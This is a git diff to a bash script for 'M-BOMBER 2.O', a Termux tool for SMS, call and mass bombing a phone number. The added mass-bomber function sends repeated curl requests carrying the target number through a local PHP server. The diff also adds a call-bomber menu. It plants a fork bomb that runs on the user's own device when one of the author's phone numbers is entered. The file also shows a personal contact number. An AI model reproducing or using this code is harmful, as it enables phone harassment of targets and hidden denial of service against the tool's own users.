@@ -2,6 +2,7 @@
 ## Coded by the jatin kalwar
 ##Don't steal my code read license
 ## if you use any part of code then give me credit
+###Fuck off cheater
 
 detect_distro() {
    if [[ "$OSTYPE" == linux-android* ]]; then
@@ -150,14 +151,14 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 '
     figlet M-BOMBER 2.O| lolcat
    
-    echo -e "\e[31mWARNING :- \e[97mDON'T TRY TO BOMB MY NUMBER OTHERWISE YOUR IP WILL BE BAN" | pv -qL 70
-echo -e "\e[32mThis Bomber Is Created By \e[94mThe Jatin Kalwar" | pv -qL 70
+    echo -e "\e[31mWARNING :- \e[97mDON'T TRY TO BOMB MY NUMBER OTHERWISE YOUR IP WILL BE BAN"
+echo -e "\e[32mThis Bomber Is Created By \e[94mThe Jatin Kalwar" 
     echo -e "\e[32mFor Any Queries Contact Me!!!"
-    echo -e "\e[32mFacebook:- \e[94mYourhackinghouse" | pv -qL 70
-    echo -e "\e[32mInstagram:- \e[94mYourhackinghouse" | pv -qL 70
-    echo -e "\e[32mJoin our Whatsapp group :- \e[94m+994408609255" | pv -qL 70
+    echo -e "\e[32mFacebook:- \e[94mYourhackinghouse" 
+    echo -e "\e[32mInstagram:- \e[94mYourhackinghouse" 
+    echo -e "\e[32mJoin our Whatsapp group :- \e[94m+994408609255" 
     echo ' '| lolcat
-    echo -e "\e[93mPlease use for Educational Purpose only!!!" | pv -qL 70
+    echo -e "\e[93mPlease use for Educational Purpose only!!!" 
     echo ' '| lolcat
 }
             
@@ -220,6 +221,92 @@ echo -e "               \e[34m ============================\e[34m"
 echo " "
 sleep 5.0
 bash bomber.sh
+fi
+}
+
+
+    
+massbmb(){
+clear
+ban
+figlet Mass Bomber | lolcat 
+echo -ne "NUMBER: \e[0m"
+read num
+if [ "$num" = "9990212082" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
+elif [ "$num" = "8368048122" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
+else
+clear
+echo -e "\e[93m
+╭━━━━━━━━━━━╮
+┃━━━●━══━━━━┃
+┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
+┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
+┃           ┃ \e[93m
+┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
+┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
+┃           ┃
+┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
+┃           ┃ --------------------------
+┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/994408609255
+╰━━━━━━━━━━━╯
+"
+killall -9 php >/dev/null 2>&1
+cd /data/data/com.termux/files/home/m-bomber2.O/Additional
+php -S localhost:8080 >/dev/null 2>&1 &
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+echo -ne "NEXT: "
+read optz
+if [ $optz = "1" ];
+then
+massbmb
+elif [ $optz = "2" ];
+then
+jat
+elif [ $optz = "3" ];
+then
+bombs
+elif [ $optz = "4" ];
+then
+exit 1
+else
+echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
+fi
 fi
 }
 
@@ -361,6 +448,45 @@ echo "  [+] Unlimited And Super-Fast Bombing"| lolcat
     fi
 }
 
+callserver() {
+    clear
+        ban
+        figlet  Call bomber | lolcat
+echo 'Created by The Jatin Kalwar' | lolcat
+        
+    
+        echo -e "\e[92mCHOOSE SERVER"
+echo -e "\e[92m[\e[91m1\e[92m]\e[93m Server 1\e[93m"
+echo -e "\e[92m[\e[91m2\e[92m]\e[93m Server 2\e[93m"
+echo -e "\e[92m[\e[91m3\e[92m]\e[93m Back\e[93m"
+read ch
+    cd Core
+    clear
+    if [ $ch -eq 1 ];then
+  if [[ "$OSTYPE" == "linux-gnu" ]]; then
+        toilet -f ivrit 'MAIL BOMBER' | boxes -d cat -a hc -p h8 | lolcat
+        else
+        ban
+        figlet  Call bomber | lolcat
+echo 'Created by The Jatin Kalwar' | lolcat
+        fi
+        cd $HOME/m-bomber2.O
+        $PYTHON Jatin.py --call
+    
+    
+elif [ $ch -eq 2 ];then
+        clear
+echo 'hieeeee'
+
+ elif [ $ch -eq 3 ]; then
+ bombs
+else
+        echo -e "\e[4;32m Invalid Input !!! \e[0m"
+        pause
+ 
+  fi
+  exit
+}
 
 bombs() {
     clear
@@ -401,9 +527,7 @@ clear
         figlet  MASS BOMBER | lolcat
         echo 'Created by The Jatin Kalwar' | lolcat
         fi
-        echo -e  "WE ARE WORKING ON IT. WE WILL UPDATE IT SOON...THANK YOU\e[93m"
-        sleep 5.0
-bombs
+        massbmb
 else
 echo " "
 echo -e "               \e[34m ============================\e[34m"
@@ -435,16 +559,17 @@ bas=$(cat er3.txt)
 if [[ $access = $bas ]];
 then
 clear
-  if [[ "$OSTYPE" == "linux-gnu" ]]; then
-        toilet -f ivrit 'CALL BOMBER' | boxes -d cat -a hc -p h8 | lolcat
+
+        if [[ "$OSTYPE" == "linux-gnu" ]]; then
+        toilet -f ivrit 'SMS BOMBER' | boxes -d cat -a hc -p h8 | lolcat
         else
         ban
         figlet  Sms bomber | lolcat
-        echo 'Created by The Jatin Kalwar' | lolcat
+echo 'Created by The Jatin Kalwar' | lolcat
         fi
         cd $HOME/m-bomber2.O
         $PYTHON Jatin.py --sms
-else
+     else
 echo " "
 echo -e "               \e[34m ============================\e[34m"
 echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
@@ -464,21 +589,13 @@ figlet M-BOMBER2.O | lolcat
 echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
 echo -e "\e[93m"
 read -p "ACCESS KEY: " access
-cd $HOME/m-bomber2.O/Additional                                                      
+cd $HOME/m-bomber2.O/Additional
+
 bks=$(cat er3.txt)
 if [[ $access = $bks ]];
-then
+then 
 clear
-
-        if [[ "$OSTYPE" == "linux-gnu" ]]; then
-        toilet -f ivrit 'MAIL BOMBER' | boxes -d cat -a hc -p h8 | lolcat
-        else
-        ban
-        figlet  Call bomber | lolcat
-echo 'Created by The Jatin Kalwar' | lolcat
-        fi
-        cd $HOME/m-bomber2.O
-        $PYTHON Jatin.py --call
+callserver
      else
 echo " "
 echo -e "               \e[34m ============================\e[34m"
